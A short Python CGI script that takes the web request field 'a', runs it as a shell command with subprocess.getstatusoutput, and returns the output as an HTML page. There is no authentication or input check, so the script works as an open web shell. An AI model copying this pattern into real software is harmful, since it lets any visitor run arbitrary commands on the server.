#!/usr/bin/python3
print("content-type: text/html")
print()
import cgi
import subprocess as sb
y=cgi.FieldStorage()
cmd=y.getvalue('a')

x=sb.getstatusoutput(cmd)
if x[0]==0:
	print(x[1])
else:
	print("There is no such command available")
#print("Successfully executed python code")
